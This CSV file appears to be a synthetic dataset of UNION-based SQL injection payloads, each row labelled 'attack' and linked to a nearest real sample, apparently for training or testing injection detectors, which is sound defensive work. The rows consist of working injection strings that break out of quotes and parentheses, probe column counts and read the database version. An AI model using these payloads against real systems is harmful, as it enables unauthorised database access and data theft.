id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000181,attack,union,"1'+  (  select yfuu where 1717  =  1717 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000317,5.43874482067413
CTGAN_000182,attack,union,"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",nearest_attack_euclidean,R000468,4.514771916496687
CTGAN_000183,attack,union,"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",nearest_attack_euclidean,R000771,4.250982319021557
CTGAN_000184,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000413,5.676917221809512
CTGAN_000185,attack,union,"-5738""  )   as efbn where 8541  =  8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#",nearest_attack_euclidean,R000687,4.848816296129951
CTGAN_000186,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000014,4.166162489782093
CTGAN_000187,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000495,4.116134511472758
CTGAN_000188,attack,union,"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",nearest_attack_euclidean,R000423,5.031955727557582
CTGAN_000189,attack,union," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000088,7.255573731901522
CTGAN_000190,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.660308841408743
CTGAN_000191,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000595,5.675709482922227
CTGAN_000192,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000349,5.179458389093875
CTGAN_000193,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,6.103822948450698
CTGAN_000194,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000294,5.814373777921864
CTGAN_000195,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,3.7292565496126886
CTGAN_000196,attack,union,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",nearest_attack_euclidean,R000589,5.995594816152352
CTGAN_000197,attack,union,"-5810 union all select 6307,6307,6307,6307,6307,6307,6307--",nearest_attack_euclidean,R000518,4.501083055899536
CTGAN_000198,attack,union,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",nearest_attack_euclidean,R000517,7.042594639192418
CTGAN_000199,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000190,4.644402810948445
CTGAN_000200,attack,union,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",nearest_attack_euclidean,R000352,5.195937646956053
CTGAN_000201,attack,union,"-1055' union all select 7758,7758,7758,7758,7758,7758--",nearest_attack_euclidean,R000546,5.941099150900901
CTGAN_000202,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,4.2246938166007695
CTGAN_000203,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R000682,6.097138932284382
CTGAN_000204,attack,union," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000091,6.714123189129705
CTGAN_000205,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,5.150760092193572
CTGAN_000206,attack,union," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",nearest_attack_euclidean,R000051,6.313581856033135
CTGAN_000207,attack,union,"-8491"" where 9043  =  9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",nearest_attack_euclidean,R000628,6.217587653906237
CTGAN_000208,attack,union,"-6360'  )   as yfrk where 3683  =  3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",nearest_attack_euclidean,R000443,4.249378256134283
CTGAN_000209,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,4.841195317899632
CTGAN_000210,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000180,5.655061643249557
CTGAN_000211,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000359,4.354140706914758
CTGAN_000212,attack,union,"-9256""   )    )    union all select 2977,2977,2977,2977,2977,2977,2977--",nearest_attack_euclidean,R000635,5.000596481181743
CTGAN_000213,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000359,5.2286532872238505
CTGAN_000214,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,6.777847706971246
CTGAN_000215,attack,union," select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000135,7.09514225222198
CTGAN_000216,attack,union,"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",nearest_attack_euclidean,R000442,5.121015408668282
CTGAN_000217,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000454,5.017100843119837
CTGAN_000218,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R000644,4.9812668650150655
CTGAN_000219,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,5.934401218534023
CTGAN_000220,attack,union,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",nearest_attack_euclidean,R000517,3.5829350825567925
CTGAN_000221,attack,union,"-7868' in boolean mode  )   union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",nearest_attack_euclidean,R000309,3.952330712233013
CTGAN_000222,attack,union,"-4085'+  (  select aipn where 5493  =  5493 union all select 5493,5493,5493,5493,5493,5493,5493#",nearest_attack_euclidean,R000230,6.041982138881585
CTGAN_000223,attack,union,"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",nearest_attack_euclidean,R000685,6.400317293130972
CTGAN_000224,attack,union,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",nearest_attack_euclidean,R000549,4.100111887063497
CTGAN_000225,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,6.2527598502545185
CTGAN_000226,attack,union,"-4305  )   as ldrt where 2567  =  2567 union all select 2567,2567,2567,2567,2567,2567,2567#",nearest_attack_euclidean,R000395,5.584608087094364
CTGAN_000227,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,7.275927023376909
CTGAN_000228,attack,union,"-2375 union all select 1573,1573,1573,1573#",nearest_attack_euclidean,R000283,4.265410903782837
CTGAN_000229,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000319,5.820879305863656
CTGAN_000230,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000466,5.192575373234725
CTGAN_000231,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000514,5.710788534076737
CTGAN_000232,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,5.57496258171821
CTGAN_000233,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,4.602436399830711
CTGAN_000234,attack,union,"-9758'+  (  select 'rlcy' where 3691  =  3691 union all select 3691,3691,3691,3691,3691,3691,3691--",nearest_attack_euclidean,R000704,4.147186363378088
CTGAN_000235,attack,union,"-9558""   )    )     )   union all select 2935,2935,2935,2935,2935--",nearest_attack_euclidean,R000427,5.266616666917794
CTGAN_000236,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,5.941774182944514
CTGAN_000237,attack,union," select * from users where id  =  1 or $ 1  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000151,4.694399884941959
CTGAN_000238,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,5.731795216189228
CTGAN_000239,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000525,5.11078227389747
CTGAN_000240,attack,union,"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",nearest_attack_euclidean,R000262,6.193752864758906
CTGAN_000241,attack,union,"-6597'+  (  select aewz where 4036  =  4036 union all select 4036,4036,4036,4036,4036,4036,4036--",nearest_attack_euclidean,R000229,3.7384322009559767
CTGAN_000242,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000349,5.135383663948223
CTGAN_000243,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000527,4.289370802491872
CTGAN_000244,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000505,5.860704610024938
CTGAN_000245,attack,union,"1'+  (  select oqvo where 7448  =  7448 union all select null,null,null,null,null--",nearest_attack_euclidean,R000281,3.8722537214584247
CTGAN_000246,attack,union,"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--",nearest_attack_euclidean,R000699,5.089950489941854
CTGAN_000247,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000177,4.436826330930549
CTGAN_000248,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000766,4.901266929593012
CTGAN_000249,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,4.848838700976074
CTGAN_000250,attack,union,"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",nearest_attack_euclidean,R000685,4.874233636586271
CTGAN_000251,attack,union,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",nearest_attack_euclidean,R000298,6.213648697052638
CTGAN_000252,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,5.7988622928656985
CTGAN_000253,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000232,5.160969957169999
CTGAN_000254,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000474,5.762072916155983
CTGAN_000255,attack,union,"1'+  (  select 'tzey' where 4491  =  4491 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000553,6.219402345741406
CTGAN_000256,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000180,4.662975564140427
CTGAN_000257,attack,union," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",nearest_attack_euclidean,R000051,5.8702002320307285
CTGAN_000258,attack,union,"-8203""  )   union all select 6394,6394,6394,6394,6394--",nearest_attack_euclidean,R000520,6.045685077389129
CTGAN_000259,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000144,4.766575820645377
CTGAN_000260,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R000746,4.780031206119163
CTGAN_000261,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000178,5.884750846795881
CTGAN_000262,attack,union,"-8783'   )    )    union all select 4834,4834,4834,4834,4834,4834,4834,4834,4834--",nearest_attack_euclidean,R000569,5.8337089031663805
CTGAN_000263,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000417,5.988761996611452
CTGAN_000264,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000178,5.610619038202105
CTGAN_000265,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000571,6.018617014808001
CTGAN_000266,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000466,6.116157355731616
CTGAN_000267,attack,union,"-8566""  )   as hnch where 3418  =  3418 union all select 3418,3418,3418,3418,3418,3418,3418#",nearest_attack_euclidean,R000209,4.982671473047102
CTGAN_000268,attack,union,"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000702,5.334896276184447
CTGAN_000269,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000199,5.027670839742339
CTGAN_000270,attack,union,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",nearest_attack_euclidean,R000549,6.1939949478603555
CTGAN_000271,attack,union,"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",nearest_attack_euclidean,R000442,5.956856558349876
CTGAN_000272,attack,union,"1   )    )    as bwrg where 3254  =  3254 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000249,4.780729263619467
CTGAN_000273,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,6.037260938304389
CTGAN_000274,attack,union,"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",nearest_attack_euclidean,R000771,5.500992546145853
CTGAN_000275,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,5.15441982646031
CTGAN_000276,attack,union,"-5372""  )   as wlqm where 2432  =  2432 union all select 2432,2432,2432,2432,2432,2432#",nearest_attack_euclidean,R000324,6.5549953717347655
CTGAN_000277,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000219,3.998812450145402
CTGAN_000278,attack,union,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",nearest_attack_euclidean,R000517,7.284987026111255
CTGAN_000279,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000571,4.641935010649122
CTGAN_000280,attack,union,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000458,5.688054248054357
CTGAN_000281,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000754,6.273625045579993
CTGAN_000282,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000261,6.5671889449515835
CTGAN_000283,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000505,6.228369622017602
CTGAN_000284,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,6.766823412999611
CTGAN_000285,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,5.275020836682056
CTGAN_000286,attack,union,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",nearest_attack_euclidean,R000738,6.695540634506362
CTGAN_000287,attack,union,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",nearest_attack_euclidean,R000575,4.059050830017011
CTGAN_000288,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000474,5.491002959618513
CTGAN_000289,attack,union,"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",nearest_attack_euclidean,R000228,5.987959724017938
CTGAN_000290,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,5.0252309893721
CTGAN_000291,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,6.807928146847465
CTGAN_000292,attack,union,"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",nearest_attack_euclidean,R000265,5.921041171437363
CTGAN_000293,attack,union,"-5058%' union all select 6789,6789,6789,6789,6789#",nearest_attack_euclidean,R000355,4.387857910556515
CTGAN_000294,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,4.614145648575803
CTGAN_000295,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,6.123501269660508
CTGAN_000296,attack,union," select * from users where id  =  1 union select +!<@,version  (    )   -- 1",nearest_attack_euclidean,R000072,6.553008179780704
CTGAN_000297,attack,union,"-5160'  )   union all select 8067,8067,8067,8067,8067,8067,8067--",nearest_attack_euclidean,R000751,5.841380651781628
CTGAN_000298,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.778070003169015
CTGAN_000299,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,4.317159173598349
CTGAN_000300,attack,union,"-5160'  )   union all select 8067,8067,8067,8067,8067,8067,8067--",nearest_attack_euclidean,R000751,4.362913871891559
CTGAN_000301,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,5.505780384585814
CTGAN_000302,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R000711,7.030020821608595
CTGAN_000303,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,6.316198729369996
CTGAN_000304,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R000644,5.435296998055463
CTGAN_000305,attack,union,"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",nearest_attack_euclidean,R000624,5.536626854565954
CTGAN_000306,attack,union,"-6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",nearest_attack_euclidean,R000260,7.122322992041435
CTGAN_000307,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000504,5.782931737466928
CTGAN_000308,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000559,4.57471862787975
CTGAN_000309,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,6.111735362195786
CTGAN_000310,attack,union,"-3347'+  (  select xuzs where 1076  =  1076 union all select 1076,1076,1076,1076,1076--",nearest_attack_euclidean,R000325,6.318357293187464
CTGAN_000311,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,5.50337736673802
CTGAN_000312,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000408,4.500621890650777
CTGAN_000313,attack,union,"-8783'   )    )    union all select 4834,4834,4834,4834,4834,4834,4834,4834,4834--",nearest_attack_euclidean,R000569,2.6663865723081863
CTGAN_000314,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000349,5.450657937311497
CTGAN_000315,attack,union,"-5058%' union all select 6789,6789,6789,6789,6789#",nearest_attack_euclidean,R000355,4.5540062236437
CTGAN_000316,attack,union,"1'+  (  select kpso where 1226  =  1226 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000350,5.229735215618684
CTGAN_000317,attack,union,"-3955%'   )    )    union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",nearest_attack_euclidean,R000205,7.1931818660166496
CTGAN_000318,attack,union,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",nearest_attack_euclidean,R000289,4.638746704379494
CTGAN_000319,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000349,6.0358051569152
CTGAN_000320,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,6.095150973678724
CTGAN_000321,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,4.632606280902202
CTGAN_000322,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000444,5.390477099899988
CTGAN_000323,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000542,7.004480534136052
CTGAN_000324,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000761,7.97028319642348
CTGAN_000325,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000444,5.134995503556919
CTGAN_000326,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000466,6.557810372728765
CTGAN_000327,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,4.657824381089353
CTGAN_000328,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000505,4.683970223958617
CTGAN_000329,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,5.058262130995052
CTGAN_000330,attack,union,"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",nearest_attack_euclidean,R000675,6.232009503958735
CTGAN_000331,attack,union,-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--,nearest_attack_euclidean,R000662,6.341021530074773
CTGAN_000332,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,5.093460528869802
CTGAN_000333,attack,union,"1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000236,5.2939488311293985
CTGAN_000334,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000474,5.462049389282823
CTGAN_000335,attack,union,"-9389' where 5713  =  5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",nearest_attack_euclidean,R000490,5.96908872746589
CTGAN_000336,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000302,5.266849916439868
CTGAN_000337,attack,union,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",nearest_attack_euclidean,R000517,6.26753658563947
CTGAN_000338,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,4.437817822966
CTGAN_000339,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000466,4.28945964215037
CTGAN_000340,attack,union," select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",nearest_attack_euclidean,R000139,7.315902206392498
CTGAN_000341,attack,union,"-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--",nearest_attack_euclidean,R000362,5.717417837923093
CTGAN_000342,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000761,6.8541460439142945
CTGAN_000343,attack,union,"1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000236,6.31093354510387
CTGAN_000344,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000554,5.4703291492803165
CTGAN_000345,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,7.015544293280756
CTGAN_000346,attack,union,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",nearest_attack_euclidean,R000697,6.495955332806776
CTGAN_000347,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,4.2398531855660915
CTGAN_000348,attack,union,"-7869%' union all select 2406,2406,2406,2406,2406,2406,2406,2406#",nearest_attack_euclidean,R000718,5.5555258488592605
CTGAN_000349,attack,union,"-9382'  )   union all select 4774,4774,4774,4774--",nearest_attack_euclidean,R000591,5.588524129783172
CTGAN_000350,attack,union,"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--",nearest_attack_euclidean,R000699,5.945610887190728
CTGAN_000351,attack,union,"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",nearest_attack_euclidean,R000251,7.416310046252396
CTGAN_000352,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000169,8.193519834319968
CTGAN_000353,attack,union,"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",nearest_attack_euclidean,R000265,6.542555401076663
CTGAN_000354,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,6.836904183028092
CTGAN_000355,attack,union,"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",nearest_attack_euclidean,R000771,7.375170950110072
CTGAN_000356,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000169,6.14584695038168
CTGAN_000357,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000300,4.079418813419024
CTGAN_000358,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000429,4.9737648004365616
CTGAN_000359,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,4.175431980653155
CTGAN_000360,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,6.502309403788604
CTGAN_000361,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000466,5.236072511459263
